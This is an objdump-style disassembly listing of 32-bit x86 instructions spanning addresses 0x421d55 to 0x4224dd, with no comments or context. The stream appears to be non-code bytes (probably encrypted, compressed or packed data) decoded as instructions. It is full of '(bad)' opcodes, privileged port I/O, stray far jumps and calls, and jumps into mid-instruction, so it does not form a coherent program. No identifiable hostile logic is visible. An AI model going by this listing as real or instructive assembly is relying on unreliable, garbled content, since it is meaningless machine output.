  421d55:	jp     0x421db3
  421d57:	mov    edi,edi
  421d59:	fiadd  WORD PTR [edx]
  421d5b:	lds    ebx,FWORD PTR [ebx-0x61e206f8]
  421d61:	jb     0x421de0
  421d63:	inc    esp
  421d64:	pop    esp
  421d65:	loop   0x421d29
  421d67:	std    
  421d68:	pop    es
  421d69:	nop
  421d6a:	mov    cl,0x9
  421d6c:	adc    al,0x32
  421d6e:	sub    dl,bh
  421d70:	fwait
  421d71:	cmp    ebx,0x83b4e7b
  421d77:	sbb    ah,BYTE PTR [esi+0x1d]
  421d7a:	mov    ds:0x95ce9b52,al
  421d7f:	imul   ecx,DWORD PTR [edx+0x4],0xffffff83
  421d83:	outs   dx,DWORD PTR ds:[esi]
  421d84:	fwait
  421d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d86:	mov    WORD PTR [ebx],ds
  421d88:	sbb    bl,BYTE PTR [edx-0x78]
  421d8b:	cwde   
  421d8c:	pushf  
  421d8d:	fnsave [ecx]
  421d8f:	add    al,0x2f
  421d91:	push   es
  421d92:	clc    
  421d93:	fcomi  st,st(5)
  421d95:	sbb    BYTE PTR [eax-0x43936d6],dl
  421d9b:	and    ch,0x6b
  421d9e:	jbe    0x421dea
  421da0:	lock cli 
  421da2:	jmp    0x421dae
  421da4:	cwde   
  421da5:	outs   dx,BYTE PTR ds:[esi]
  421da6:	xor    eax,esi
  421da8:	fwait
  421da9:	neg    ch
  421dab:	sar    BYTE PTR [ecx-0x764f3c4d],cl
  421db1:	(bad)  
  421db3:	xlat   BYTE PTR ds:[ebx]
  421db4:	xchg   ecx,eax
  421db5:	jmp    0x421e30
  421db7:	out    0xc8,al
  421db9:	push   cs
  421dba:	nop
  421dbb:	(bad)  
  421dbd:	cli    
  421dbe:	jecxz  0x421d87
  421dc0:	jp     0x421e30
  421dc2:	dec    esi
  421dc3:	dec    esp
  421dc4:	cli    
  421dc5:	addr16 xchg edi,eax
  421dc7:	fisttp QWORD PTR [ebx+0x4]
  421dca:	jo     0x421dac
  421dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dcd:	pop    ds
  421dce:	fwait
  421dcf:	mov    ds:0xc9f1d5e8,eax
  421dd4:	fwait
  421dd5:	pop    ebx
  421dd6:	push   0xffffffb8
  421dd8:	jb     0x421db8
  421dda:	aam    0x2a
  421ddc:	ret    0x702
  421ddf:	pop    esp
  421de0:	out    0xa,eax
  421de2:	nop
  421de3:	or     DWORD PTR [ecx],edx
  421de5:	clc    
  421de6:	lods   al,BYTE PTR ds:[esi]
  421de7:	cmp    BYTE PTR ss:[ecx+eax*1],ah
  421deb:	dec    edx
  421dec:	push   es
  421ded:	mov    eax,ds:0xab1b6f5f
  421df2:	(bad)  
  421df4:	fwait
  421df5:	aad    0xbf
  421df7:	sbb    ecx,DWORD PTR [ecx-0x1e9feb4a]
  421dfd:	fst    QWORD PTR [edi+eax*2-0xb8690b7]
  421e04:	loop   0x421e00
  421e06:	(bad)  
  421e07:	arpl   WORD PTR [edi-0xcba9316],bp
  421e0d:	fldenv [eax+0x3e328149]
  421e13:	(bad)  
  421e14:	jb     0x421e81
  421e16:	pop    es
  421e17:	outs   dx,DWORD PTR ds:[esi]
  421e18:	xchg   ebx,eax
  421e19:	loope  0x421dab
  421e1b:	out    dx,al
  421e1c:	add    BYTE PTR [edi+0x2d],bl
  421e1f:	shl    BYTE PTR [edx-0x77],1
  421e22:	je     0x421dd5
  421e24:	xor    edi,ebx
  421e26:	icebp  
  421e27:	cmc    
  421e28:	aam    0x3b
  421e2a:	mov    al,0x53
  421e2c:	sub    bl,BYTE PTR [esi-0x6956e7ac]
  421e32:	in     al,dx
  421e33:	xor    BYTE PTR [ebx],cl
  421e35:	ds lock ret 0xcf1e
  421e3a:	push   ds
  421e3b:	dec    ebp
  421e3c:	cdq    
  421e3d:	mov    ecx,0xc18d31f9
  421e42:	adc    BYTE PTR [ecx+0x22904a9f],dh
  421e48:	mov    ds:0x104ee2a4,eax
  421e4d:	das    
  421e4e:	xchg   edx,eax
  421e4f:	loope  0x421dd3
  421e51:	ficomp WORD PTR [esi-0x3d154f43]
  421e57:	xor    ecx,DWORD PTR [ebx-0x37]
  421e5a:	nop
  421e5b:	test   al,0xd
  421e5d:	fwait
  421e5e:	cmp    eax,0x22dc9889
  421e63:	dec    edx
  421e64:	mov    esi,0x44e8e554
  421e69:	popf   
  421e6a:	lahf   
  421e6b:	adc    al,0x9e
  421e6d:	stc    
  421e6e:	mov    eax,ds:0xb6d5c718
  421e73:	adc    DWORD PTR [ebx+0x67],esp
  421e76:	imul   ecx,DWORD PTR [ebp-0x57],0xc00bbb35
  421e7d:	pop    edx
  421e7e:	inc    ecx
  421e7f:	in     eax,dx
  421e80:	jmp    0x421e23
  421e82:	cwde   
  421e83:	dec    eax
  421e84:	mov    bh,0x6f
  421e86:	sbb    BYTE PTR [esi],cl
  421e88:	fst    st(6)
  421e8a:	mov    esp,0x71e96f0
  421e8f:	jb     0x421ee3
  421e91:	fimul  WORD PTR [eax]
  421e93:	and    DWORD PTR [ecx+0x70f28e5f],esi
  421e99:	mov    ebp,0x529f8b97
  421e9e:	push   esi
  421e9f:	scas   eax,DWORD PTR es:[edi]
  421ea0:	mov    ebx,0xe843d6bf
  421ea5:	sub    al,0x24
  421ea7:	xor    ah,BYTE PTR [ecx+0x32e895dd]
  421ead:	jmp    0x421f26
  421eaf:	xor    esp,DWORD PTR [ebp-0x588d6df7]
  421eb5:	fnsave [esi+0xff8ec62]
  421ebb:	pop    ds
  421ebc:	mov    DWORD PTR [eax+0x6a2c6790],esi
  421ec2:	ror    BYTE PTR [esi+0x49e36958],0xa4
  421ec9:	sub    DWORD PTR [esp+eax*8],0xae3250d0
  421ed0:	fwait
  421ed1:	cmp    BYTE PTR [edi-0x4e7f0d07],bh
  421ed7:	jns    0x421ed0
  421ed9:	fnstsw WORD PTR [edx+0x20b53fa]
  421edf:	xor    eax,0x9191cb26
  421ee4:	fnsave [edx-0x15]
  421ee7:	or     DWORD PTR [ecx+0x31],0xde0e4bf0
  421eee:	pop    ss
  421eef:	fnstsw WORD PTR [ebx+edx*8-0x35124b27]
  421ef6:	nop
  421ef7:	mov    bx,0x3b5d
  421efb:	not    DWORD PTR [ecx-0x7e]
  421efe:	push   esi
  421eff:	dec    edx
  421f00:	(bad)  
  421f02:	jecxz  0x421ee2
  421f04:	call   0x9b6f5019
  421f09:	or     al,0x8f
  421f0b:	shl    BYTE PTR [esi],1
  421f0d:	iret   
  421f0e:	stos   BYTE PTR es:[edi],al
  421f0f:	lds    ebp,FWORD PTR [esi+0x16]
  421f12:	ja     0x421f7f
  421f14:	sub    ecx,esi
  421f16:	in     al,0x9
  421f18:	fild   DWORD PTR [edi]
  421f1a:	inc    edx
  421f1b:	mov    eax,ds:0xfde0c981
  421f20:	dec    ebp
  421f21:	out    dx,eax
  421f22:	into   
  421f23:	fwait
  421f24:	rcr    ebp,1
  421f26:	fld    TBYTE PTR [ebx+0x1a6a497b]
  421f2c:	mov    ecx,0xa858a3fb
  421f31:	sbb    eax,0x8450a7f7
  421f36:	push   ss
  421f37:	shl    BYTE PTR [edx+0x1c009b05],cl
  421f3d:	xor    BYTE PTR es:[esi+0x5796b743],ch
  421f44:	sbb    ebp,edx
  421f46:	add    al,0xd4
  421f48:	fist   DWORD PTR [ebp+0x3]
  421f4b:	ins    DWORD PTR es:[edi],dx
  421f4c:	adc    DWORD PTR [edi+0xe66a897],0x310b2d9e
  421f56:	aam    0x43
  421f58:	pop    ecx
  421f59:	in     eax,dx
  421f5a:	cs stc 
  421f5c:	aam    0x1c
  421f5e:	xor    BYTE PTR [esi],al
  421f60:	add    dh,BYTE PTR [edx-0x44]
  421f63:	mov    bh,0x9e
  421f65:	imul   esp
  421f67:	xchg   ebx,eax
  421f68:	stos   DWORD PTR es:[edi],eax
  421f69:	rcl    DWORD PTR [edx-0x6],0x6c
  421f6d:	add    al,0xd1
  421f6f:	xor    BYTE PTR gs:[ecx+0x5],ch
  421f73:	mov    ah,BYTE PTR [eax+0x61]
  421f76:	enter  0x41b5,0xbe
  421f7a:	nop
  421f7b:	inc    ax
  421f7d:	test   DWORD PTR [ecx-0x359177a7],eax
  421f83:	dec    ecx
  421f84:	cmp    DWORD PTR [edx+0x62],edi
  421f87:	mov    ebp,0xe965e292
  421f8c:	fwait
  421f8d:	cmc    
  421f8e:	push   esi
  421f8f:	jnp    0x422003
  421f91:	add    eax,0x591d87bc
  421f96:	cld    
  421f97:	dec    ecx
  421f98:	das    
  421f99:	ret    
  421f9a:	dec    edi
  421f9b:	in     al,dx
  421f9c:	fmul   QWORD PTR [ebp+edx*8-0x1c]
  421fa0:	lahf   
  421fa1:	inc    ebp
  421fa2:	mov    eax,0x50a61866
  421fa7:	imul   esp,DWORD PTR [ecx+0x75],0xffffffe2
  421fab:	dec    ecx
  421fac:	push   cs
  421fad:	pop    edi
  421fae:	lahf   
  421faf:	mov    esi,0x5d98cfe3
  421fb4:	mov    ds:0x620d95d9,al
  421fb9:	cmp    BYTE PTR [edi+0x7b845b89],ch
  421fbf:	retf   
  421fc0:	dec    esi
  421fc1:	fiadd  WORD PTR [esp+eax*8-0x80]
  421fc5:	cwde   
  421fc6:	cmp    BYTE PTR ds:0xdc7c69e8,ch
  421fcc:	fwait
  421fcd:	pop    ebx
  421fce:	inc    esi
  421fcf:	lods   eax,DWORD PTR ds:[esi]
  421fd0:	sbb    eax,0x9d3028d7
  421fd5:	fstp   st(5)
  421fd7:	loop   0x421fd3
  421fd9:	fldcw  WORD PTR [ecx-0x6f]
  421fdc:	inc    ecx
  421fdd:	sub    DWORD PTR [eax+0x7962e58b],edx
  421fe3:	test   DWORD PTR [ebp+0x27499cac],edi
  421fe9:	daa    
  421fea:	inc    esp
  421feb:	cld    
  421fec:	fsubr  QWORD PTR [esi+edx*8+0xa]
  421ff0:	fwait
  421ff1:	xchg   esp,eax
  421ff2:	sbb    DWORD PTR [esi],ebp
  421ff4:	or     al,0xc8
  421ff6:	fadd   st(6),st
  421ff8:	pop    eax
  421ff9:	fistp  QWORD PTR [edi+ebx*8-0x168a9e01]
  422000:	stos   DWORD PTR es:[edi],eax
  422001:	mov    ch,0x15
  422003:	retf   
  422004:	fwait
  422005:	jmp    0x659a:0x825c64b6
  42200c:	pusha  
  42200d:	fsubrp st(0),st
  42200f:	or     al,0x51
  422011:	cmp    edi,DWORD PTR [edx-0x6fbe4ef8]
  422017:	jl     0x421fa9
  422019:	mov    ah,0x81
  42201b:	lock xor BYTE PTR [ebp+edx*8-0x630354b7],ch
  422023:	ins    BYTE PTR es:[edi],dx
  422024:	xchg   ecx,eax
  422025:	pushf  
  422026:	jae    0x421ffa
  422028:	or     eax,0xd5459057
  42202d:	inc    edi
  42202e:	dec    ecx
  42202f:	sbb    al,0x10
  422031:	popf   
  422032:	std    
  422033:	dec    ecx
  422034:	push   ss
  422035:	aas    
  422036:	adc    edx,esi
  422038:	sbb    eax,esp
  42203a:	sbb    ch,BYTE PTR [edx]
  42203c:	push   ebx
  42203d:	xchg   DWORD PTR [eax+0xc9731c0],edx
  422043:	cli    
  422044:	xor    BYTE PTR [edx-0x2a],al
  422047:	push   eax
  422048:	lods   eax,DWORD PTR ds:[esi]
  422049:	xchg   ebp,eax
  42204a:	outs   dx,BYTE PTR ds:[esi]
  42204b:	std    
  42204c:	fisubr WORD PTR ds:0x8d69b2af
  422052:	nop
  422053:	pop    esp
  422054:	push   ecx
  422055:	and    esi,DWORD PTR [eax-0x76]
  422058:	mov    eax,0x174a65ac
  42205d:	pop    es
  42205e:	xchg   ebp,eax
  42205f:	pop    ebp
  422060:	in     al,0x6e
  422062:	mov    ch,BYTE PTR [edi-0xb6fc1f3]
  422068:	cmp    BYTE PTR [eax+0x337e480d],ch
  42206e:	je     0x4220bf
  422070:	mul    BYTE PTR [ecx-0x6f]
  422073:	scas   eax,DWORD PTR es:[edi]
  422074:	rcr    DWORD PTR [ebp+0x4f],1
  422077:	retf   0xabe3
  42207a:	nop
  42207b:	fidiv  DWORD PTR [ebx+0x56]
  42207e:	push   eax
  42207f:	out    0x5,al
  422081:	xor    edx,DWORD PTR [esi+0x4a]
  422084:	push   es
  422085:	js     0x4220bd
  422087:	test   eax,0x3e65952f
  42208c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42208d:	jecxz  0x42208b
  42208f:	jg     0x422089
  422091:	fnsave [eax]
  422093:	jge    0x4220c2
  422095:	aam    0x1b
  422097:	dec    edx
  422098:	out    dx,eax
  422099:	ror    DWORD PTR [ebp+ebx*4-0x10],0x85
  42209e:	retf   0x9b86
  4220a1:	jmp    0x4220bc
  4220a3:	cwde   
  4220a4:	dec    esp
  4220a5:	sar    DWORD PTR [ecx+ebx*8-0x3e0c126a],0x3e
  4220ad:	dec    ecx
  4220ae:	idiv   DWORD PTR [ecx+0x48d9be07]
  4220b4:	es js  0x4220bb
  4220b7:	xlat   BYTE PTR ds:[ebx]
  4220b8:	pushf  
  4220b9:	stc    
  4220ba:	(bad)  
  4220bb:	xlat   BYTE PTR ds:[ebx]
  4220bc:	mov    edi,ss
  4220be:	xchg   edi,eax
  4220bf:	pop    es
  4220c0:	push   0x393a7f8c
  4220c5:	jns    0x4220d8
  4220c7:	dec    edx
  4220c8:	scas   al,BYTE PTR es:[edi]
  4220c9:	inc    eax
  4220ca:	sub    eax,0xa886c917
  4220cf:	push   edx
  4220d0:	fwait
  4220d1:	repnz aam 0x5
  4220d4:	ins    DWORD PTR es:[edi],dx
  4220d5:	add    eax,DWORD PTR [ebx+0x6d]
  4220d8:	cld    
  4220d9:	lds    edx,FWORD PTR [ebx+0x51]
  4220dc:	sbb    BYTE PTR [eax-0x3d],0xaf
  4220e0:	jo     0x422097
  4220e2:	ins    DWORD PTR es:[edi],dx
  4220e3:	mov    BYTE PTR [edx+edx*1],bl
  4220e6:	xchg   ebp,eax
  4220e7:	repnz xor DWORD PTR [esi-0x72],ebx
  4220eb:	xchg   ebp,eax
  4220ec:	pusha  
  4220ed:	dec    esp
  4220ee:	pop    es
  4220ef:	fwait
  4220f0:	and    esi,ebx
  4220f2:	(bad)  
  4220f3:	outs   dx,DWORD PTR ds:[esi]
  4220f4:	loopne 0x4220ff
  4220f6:	popf   
  4220f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f8:	ret    
  4220f9:	pop    esi
  4220fa:	nop
  4220fb:	dec    dx
  4220fd:	sbb    eax,0x1296a16d
  422102:	scas   eax,DWORD PTR es:[edi]
  422103:	sub    edx,DWORD PTR [ebp+0x4d4b3755]
  422109:	pop    esi
  42210a:	(bad)  
  42210b:	jmp    0x4220a9
  42210d:	sahf   
  42210e:	mov    dh,0x2d
  422110:	push   edi
  422111:	cmp    bl,BYTE PTR [edi+0x32c6146a]
  422117:	retf   0x33ce
  42211a:	pop    ecx
  42211b:	into   
  42211c:	xchg   ecx,eax
  42211d:	fidiv  WORD PTR [esi+esi*2-0x4b]
  422121:	scas   eax,DWORD PTR es:[edi]
  422122:	rol    DWORD PTR [ebx+eax*2+0x10],cl
  422126:	nop
  422127:	mov    ch,0xa6
  422129:	in     eax,dx
  42212a:	aad    0xec
  42212c:	mov    ah,0xe9
  42212e:	and    BYTE PTR [edx+0x44],cl
  422131:	jecxz  0x42214e
  422133:	pop    es
  422134:	outs   dx,DWORD PTR ds:[esi]
  422135:	mov    dh,0x76
  422137:	hlt    
  422138:	lods   eax,DWORD PTR ds:[esi]
  422139:	lds    edi,FWORD PTR [edx+0x9dd9b6c]
  42213f:	lea    esp,es:[ebp+0x44b44a01]
  422146:	loopne 0x4221bf
  422148:	cwde   
  422149:	daa    
  42214a:	call   0x94ecbce9
  42214f:	xor    ecx,DWORD PTR [esi+0x3a]
  422152:	or     eax,0x8bde0cff
  422157:	ret    
  422158:	add    DWORD PTR [edi-0xc],ebp
  42215b:	das    
  42215c:	fdiv   st,st(6)
  42215e:	lods   al,BYTE PTR ds:[esi]
  42215f:	outs   dx,DWORD PTR ds:[esi]
  422160:	aas    
  422161:	mov    edx,DWORD PTR [ebx-0x41]
  422164:	mov    eax,ds:0x85d1f94b
  422169:	mov    BYTE PTR [ebx],dh
  42216b:	dec    edx
  42216c:	and    cl,0x88
  42216f:	jp     0x4221d1
  422171:	(bad)  
  422172:	sahf   
  422173:	sbb    ebx,DWORD PTR [ebx-0x2c7c7a18]
  422179:	daa    
  42217a:	mov    BYTE PTR [ebx+0x68b057c8],cl
  422180:	and    eax,edi
  422182:	and    al,0x43
  422184:	stos   BYTE PTR es:[edi],al
  422185:	add    eax,0xbdbb3b76
  42218a:	cwde   
  42218b:	dec    esi
  42218c:	iret   
  42218d:	jle    0x42211f
  42218f:	lods   eax,DWORD PTR ds:[esi]
  422190:	cmp    bl,BYTE PTR [ecx]
  422192:	int3   
  422193:	outs   dx,DWORD PTR ds:[esi]
  422194:	std    
  422195:	icebp  
  422196:	inc    ebx
  422197:	dec    edx
  422198:	imul   eax,DWORD PTR [eax-0x6221bbc9],0xc59b1c02
  4221a2:	stos   BYTE PTR es:[edi],al
  4221a3:	hlt    
  4221a4:	retf   
  4221a5:	xchg   bl,al
  4221a7:	mov    dl,BYTE PTR [eax-0x1f]
  4221aa:	jmp    0x582a29bf
  4221af:	das    
  4221b0:	dec    ebx
  4221b1:	pop    edx
  4221b2:	mov    WORD PTR [esi-0x31f6d865],ds
  4221b8:	cwde   
  4221b9:	and    al,0x8b
  4221bb:	fdivr  DWORD PTR [edi-0xb371a23]
  4221c1:	in     al,dx
  4221c2:	push   esp
  4221c3:	mov    edx,0x2f9bb135
  4221c8:	fist   DWORD PTR [edx-0x74]
  4221cb:	retf   0x9d98
  4221ce:	mov    ch,0xb6
  4221d0:	and    ebp,esp
  4221d2:	or     DWORD PTR [esi-0x26102542],esp
  4221d8:	sahf   
  4221d9:	in     al,dx
  4221da:	pop    ebp
  4221db:	adc    DWORD PTR [ecx],ebx
  4221dd:	inc    edx
  4221de:	xchg   edi,eax
  4221df:	(bad)  
  4221e0:	push   ebp
  4221e1:	xor    cl,BYTE PTR [ebx-0x4f]
  4221e4:	jmp    0x422169
  4221e6:	mov    ?,ebp
  4221e8:	adc    esp,ecx
  4221ea:	stos   BYTE PTR es:[edi],al
  4221eb:	jb     0x422244
  4221ed:	jb     0x422173
  4221ef:	lahf   
  4221f0:	xor    esi,DWORD PTR [eax+0x4d]
  4221f3:	call   0x25eb3893
  4221f8:	imul   ebx,DWORD PTR [esi-0x21f2504d],0xd2fbf5ce
  422202:	or     dl,bh
  422204:	out    dx,eax
  422205:	loopne 0x422196
  422207:	sbb    dh,BYTE PTR [ebp+0x7146d049]
  42220d:	cs mov esp,0x69faf949
  422213:	aam    0xa
  422215:	push   eax
  422216:	add    dl,0x9b
  422219:	jbe    0x422218
  42221b:	je     0x4221a6
  42221d:	sub    al,0xc0
  42221f:	xchg   esp,eax
  422220:	jle    0x422200
  422222:	or     BYTE PTR [eax+eiz*2-0x2a],al
  422226:	mov    DWORD PTR [edi-0xb6fc3b3],ebx
  42222c:	push   esp
  42222d:	sbb    dh,al
  42222f:	shl    BYTE PTR [ebp+0x5345bd47],cl
  422235:	(bad)  
  422237:	(bad)  
  422238:	test   BYTE PTR [ebx],0xff
  42223b:	retf   
  42223c:	mov    esp,0x9bf8a8cd
  422241:	stos   DWORD PTR es:[edi],eax
  422242:	sub    cl,BYTE PTR [esi-0x3a5c4f04]
  422248:	jge    0x422228
  42224a:	mov    eax,0x8e802af5
  42224f:	lods   al,BYTE PTR ds:[esi]
  422250:	mov    eax,ds:0x70c297bd
  422255:	sbb    al,0x4f
  422257:	mov    edx,0x4207532b
  42225c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42225d:	fiadd  WORD PTR [ebp-0x5410c7b7]
  422263:	xlat   BYTE PTR ds:[ebx]
  422264:	jnp    0x422274
  422266:	stos   DWORD PTR es:[edi],eax
  422267:	mov    ebx,DWORD PTR [edx+ecx*2+0x6eed2c41]
  42226e:	cmovs  edi,ebx
  422271:	test   BYTE PTR [ebp+0x4d],dh
  422274:	mov    dl,0x9e
  422276:	cwde   
  422277:	popa   
  422278:	or     al,0x86
  42227a:	and    bh,ah
  42227c:	mov    ecx,DWORD PTR ss:[edx-0x16a66482]
  422283:	pop    esp
  422284:	mov    dh,0x9d
  422286:	rol    edi,cl
  422288:	out    dx,al
  422289:	rcl    DWORD PTR [esi-0x173b9d99],cl
  42228f:	dec    ecx
  422290:	dec    ecx
  422291:	out    0xd5,eax
  422293:	loop   0x4222fd
  422295:	popa   
  422296:	nop
  422297:	test   al,0x9a
  422299:	test   al,0xa2
  42229b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42229c:	inc    edx
  42229d:	jmp    0x70787ba9
  4222a2:	popf   
  4222a3:	cmp    edi,DWORD PTR [ebx-0x76]
  4222a6:	pop    edi
  4222a7:	shr    BYTE PTR [esi+0xd],cl
  4222aa:	lods   eax,DWORD PTR ds:[esi]
  4222ab:	mov    edx,0xf1d0b2c8
  4222b0:	jbe    0x4222ac
  4222b2:	inc    esp
  4222b3:	repz push ebp
  4222b5:	fsubp  st(1),st
  4222b7:	hlt    
  4222b8:	out    dx,al
  4222b9:	xlat   BYTE PTR ds:[ebx]
  4222ba:	lock sbb DWORD PTR [ecx+0x69b4aeef],0x1b7c6f6d
  4222c5:	loop   0x4222d3
  4222c7:	xchg   esp,eax
  4222c8:	adc    edx,DWORD PTR [ebp+0x7f]
  4222cb:	dec    edx
  4222cc:	call   0x31b6:0xa7cb6d8f
  4222d3:	sub    bl,BYTE PTR [ebx-0x42b1f951]
  4222d9:	in     al,dx
  4222da:	pop    es
  4222db:	fld    QWORD PTR [esi+0x4adbafdf]
  4222e1:	pop    ecx
  4222e2:	sbb    al,0x33
  4222e4:	call   0x3ac1:0xbf0bf5aa
  4222eb:	pop    ebx
  4222ec:	fwait
  4222ed:	cmp    ecx,DWORD PTR [eax-0x62d2fb5a]
  4222f3:	dec    edx
  4222f4:	or     BYTE PTR [edi+esi*8+0x51afd7e6],0xf
  4222fc:	xchg   cl,dl
  4222fe:	adc    cl,dh
  422300:	js     0x422335
  422302:	nop
  422303:	mov    edx,0x1bbc0a
  422308:	sub    eax,0xf82da311
  42230d:	xlat   BYTE PTR ds:[ebx]
  42230e:	xchg   esp,eax
  42230f:	dec    ebp
  422310:	loope  0x422361
  422312:	pop    eax
  422313:	ja     0x42230f
  422315:	popf   
  422316:	mov    DWORD PTR [ebp-0x20],esi
  422319:	enter  0xf593,0x3f
  42231d:	clc    
  42231e:	(bad)  
  42231f:	add    ah,BYTE PTR [esi]
  422321:	xchg   sp,ax
  422323:	repnz repnz out dx,eax
  422326:	mov    edi,0x7e181b2
  42232b:	cwde   
  42232c:	test   al,0xf8
  42232e:	push   edi
  42232f:	xchg   edx,eax
  422330:	xchg   DWORD PTR [edx],ecx
  422332:	add    esp,DWORD PTR [esi+ebp*4]
  422335:	dec    eax
  422336:	fild   WORD PTR [edx-0x65]
  422339:	addr16 mov ah,bl
  42233c:	out    0x38,eax
  42233e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42233f:	pop    edi
  422340:	pop    edx
  422341:	cmp    eax,0x33994a04
  422346:	or     al,al
  422348:	pop    eax
  422349:	rol    BYTE PTR [ebx],cl
  42234b:	jg     0x4222e8
  42234d:	test   al,0x29
  42234f:	mov    al,ds:0x853f21d8
  422354:	popf   
  422355:	fisttp QWORD PTR [edx]
  422357:	dec    edi
  422358:	imul   ebp,ebx,0x448067a8
  42235e:	nop
  42235f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422360:	cdq    
  422361:	loop   0x422388
  422363:	jo     0x4223a0
  422365:	jno    0x422366
  422367:	dec    ecx
  422368:	int3   
  422369:	jle    0x4223ce
  42236b:	sahf   
  42236c:	xlat   BYTE PTR ds:[ebx]
  42236d:	mov    ?,WORD PTR [edx+esi*8]
  422370:	mov    edx,0x55e5ce6d
  422375:	fild   QWORD PTR [edi+0x60]
  422378:	sbb    DWORD PTR [esp+eiz*4],esp
  42237b:	aad    0x93
  42237d:	cld    
  42237e:	(bad)  
  42237f:	dec    ecx
  422380:	dec    ecx
  422381:	sbb    BYTE PTR [ebx-0x140248fd],dh
  422387:	mov    al,ds:0x96974aa9
  42238c:	jp     0x422313
  42238e:	je     0x42238d
  422390:	adc    ah,BYTE PTR [ecx+0x51]
  422393:	leave  
  422394:	shl    DWORD PTR [edx],cl
  422396:	les    edi,FWORD PTR gs:[ebx-0x1398a3e5]
  42239d:	pop    ds
  42239e:	ins    BYTE PTR es:[edi],dx
  42239f:	mov    ds:0xbd60dc3,al
  4223a4:	sahf   
  4223a5:	xchg   esp,eax
  4223a6:	and    esp,esi
  4223a8:	ins    BYTE PTR es:[edi],dx
  4223a9:	mov    bl,0x97
  4223ab:	adc    ebp,ebp
  4223ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ae:	dec    esi
  4223af:	dec    edi
  4223b0:	adc    dh,BYTE PTR [edi+0x14]
  4223b3:	ds fs popa 
  4223b6:	(bad)  
  4223b7:	icebp  
  4223b8:	arpl   ax,ax
  4223ba:	pop    ebp
  4223bb:	and    DWORD PTR [ebx-0x5f7f6b8c],ebx
  4223c1:	es loop 0x422442
  4223c4:	xlat   BYTE PTR ds:[ebx]
  4223c5:	loopne 0x4223b7
  4223c7:	imul   edi,DWORD PTR [edi],0x40
  4223ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223cb:	cmp    eax,0x61aac473
  4223d0:	fwait
  4223d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d2:	inc    esp
  4223d3:	cmp    BYTE PTR [ecx-0x7c],ch
  4223d6:	cdq    
  4223d7:	ss ret 
  4223d9:	lea    ecx,[edi+0x3c]
  4223dc:	mov    ds,esi
  4223de:	or     esi,eax
  4223e0:	mov    dl,0xec
  4223e2:	repnz outs dx,BYTE PTR ds:[esi]
  4223e4:	(bad)  [esi-0x70]
  4223e7:	ret    0xc525
  4223ea:	pop    esi
  4223eb:	inc    edi
  4223ec:	xor    BYTE PTR [esi],bh
  4223ee:	in     eax,0x49
  4223f0:	out    0x4e,al
  4223f2:	div    DWORD PTR [ebp+0x78]
  4223f5:	mov    ch,0xa4
  4223f7:	adc    eax,0xf971b39b
  4223fc:	jg     0x422442
  4223fe:	fnsave [esp+ebp*2]
  422401:	sub    cl,BYTE PTR [eax+0x0]
  422404:	mov    edx,0x9f49d43b
  422409:	inc    edx
  42240a:	ins    BYTE PTR es:[edi],dx
  42240b:	aam    0xaf
  42240d:	or     ah,0xbd
  422410:	push   0xf319d05e
  422415:	cli    
  422416:	js     0x42244d
  422418:	xchg   esp,eax
  422419:	icebp  
  42241a:	cwde   
  42241b:	and    al,0x30
  42241d:	fisub  WORD PTR [edx]
  42241f:	jnp    0x422409
  422421:	pop    esi
  422422:	sbb    al,0x59
  422424:	sahf   
  422425:	dec    ebp
  422426:	shr    DWORD PTR [edi+0x546ab04],1
  42242c:	ja     0x42248c
  42242e:	jae    0x4223ef
  422430:	out    0xd5,al
  422432:	inc    edi
  422433:	dec    edx
  422434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422435:	les    eax,FWORD PTR [ebx]
  422437:	scas   al,BYTE PTR es:[edi]
  422438:	mov    eax,0x9bd7709e
  42243d:	cmp    edx,DWORD PTR [ebp+0x68c6db15]
  422443:	icebp  
  422444:	and    dh,bl
  422446:	cmp    bh,BYTE PTR [edi]
  422448:	mov    WORD PTR [edi+eax*2-0x502e2628],cs
  42244f:	inc    esp
  422450:	adc    al,0xcb
  422452:	nop
  422453:	iret   
  422454:	dec    ebp
  422455:	test   eax,0x17cfe521
  42245a:	sub    BYTE PTR [ebx+ebx*1],0xc9
  42245e:	je     0x422493
  422460:	icebp  
  422461:	pop    esi
  422462:	cwde   
  422463:	fcomp  DWORD PTR [esp+eax*1-0x230a84ba]
  42246a:	lock ror DWORD PTR [ebx],1
  42246d:	adc    ebp,esp
  42246f:	dec    ecx
  422470:	or     eax,0x69d55d92
  422475:	adc    BYTE PTR [esi],dl
  422477:	xor    BYTE PTR [eax+0x4a3e031b],ah
  42247d:	das    
  42247e:	xchg   edi,eax
  42247f:	add    ecx,DWORD PTR [eax+0x7c]
  422482:	lock in al,dx
  422484:	mov    esp,0x8028c9a
  422489:	(bad)  
  42248b:	jge    0x422460
  42248d:	loopne 0x4224a9
  42248f:	lds    ecx,FWORD PTR [edi]
  422491:	push   esp
  422492:	or     DWORD PTR [ebp-0x63939463],eax
  422498:	sbb    al,BYTE PTR [edx+0x7d1fa9f1]
  42249e:	daa    
  42249f:	xchg   edx,eax
  4224a0:	inc    eax
  4224a1:	dec    BYTE PTR [edi+0x19c3eb36]
  4224a7:	pop    es
  4224a8:	mov    esp,0xad3f9023
  4224ad:	inc    esp
  4224ae:	(bad)  [edi+edx*8]
  4224b1:	adc    DWORD PTR [edx],ebp
  4224b3:	push   ecx
  4224b4:	push   es
  4224b5:	bound  ebp,QWORD PTR [esi]
  4224b7:	or     eax,0x89ef4e1b
  4224bc:	mov    al,0xb3
  4224be:	or     eax,DWORD PTR [edx]
  4224c0:	test   eax,0x437b1a8f
  4224c5:	(bad)
  4224c8:	fwait
  4224c9:	and    eax,0xdf6ae152
  4224ce:	imul   edi,DWORD PTR [ecx+0x1f],0xffffffe7
  4224d2:	xor    ebp,edx
  4224d4:	push   ebx
  4224d5:	pop    esi
  4224d6:	les    ebx,FWORD PTR [ebp+0x1440d494]
  4224dc:	das    
  4224dd:	fist   WORD PTR [esi]
